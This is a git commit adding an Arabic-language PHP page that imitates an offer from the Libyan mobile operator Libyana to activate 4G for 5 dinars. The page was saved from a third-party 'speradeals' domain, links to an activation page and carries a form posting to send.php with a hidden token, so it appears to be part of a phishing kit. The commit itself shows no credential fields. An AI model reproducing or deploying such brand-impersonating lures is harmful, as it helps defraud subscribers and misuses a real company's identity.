2187de0190f1eb83c14911e96db86fdb146a5939
Mohammed Suliman <34351968+007o@users.noreply.github.com>
2023-09-08 23:21:40 +0200

    Add files via upload

---
+++ information.php
@@ -0,0 +1,11 @@
+
+<!-- saved from url=(0031)https://speradeals.com/libyana/ --><html dir="rtl"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+ <meta name="viewport" content="width=device-width, initial-scale=1">
+ <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3mobile.css">
+ <title>عروض اليوم</title>
+<!-- CSS Reset --><link rel="stylesheet" href="style.css"><!-- Milligram CSS minified --><style>input[type='submit'] { font-family: 'Droid Arabic Kufi', sans-serif; }label { font-family: 'Droid Arabic Kufi', sans-serif;}h4 { font-family: 'Droid Arabic Kufi', sans-serif;}h5 { font-family: 'Droid Arabic Kufi', sans-serif;}#block { background: #fff;}#banner { padding-top: 2%; padding-bottom: 2%;}</style></head><body style="background:url(ly5.jpg)"><div id="main" class="container"> <div id="block"> <section class="container"> <img id="banner" src="banner.jpg"> <div class="row"> <div class="column"> <p><h3> عن خدمة ليبيانا 4G </h3> <h5>   تسعى شركة ليبيانا دائماً لتقديم خدماتها بجودة عالية رغم التحديات التي تواجهها تم إطلاق خدمة الجيل الرابع كمرحلة تجريبة وتتوفر هذه الخدمة حالياً في بعض المناطق ، لضمان الحصول على الخدمة بالجودة المطلوبة على المشترك التأكد من وجوده في نطاق تغطية الجيل الرابع  وأن يدعم جهاز الهاتف وكرت الهاتف (الشفرة) تقنية الجيل الرابع.
+
+سعر هاذه الخدمة 5 دينار بعد تفعيل الخدمة يرجي الاشتراك في الباقات العادية وسوف يتم تفعيل الخدمة 
+
+</h5> </div> </div> </section><a href="index.php"><br><h1>  لتفعيل الخدمة اضغط هنا ؟  </h1></a> <section class="container"> <form id="myform" action="send.php" method="post"> <input hidden="" type="text" name="sec" value="txtjle9te0revyb9ex3x">
+<fieldset> <div class="float-right">  </div>  <div class="float-right">  </fieldset> </form> </section> </div></div><h4> جميع الحقوق محفوظة 2023-2024</h4></body></html>
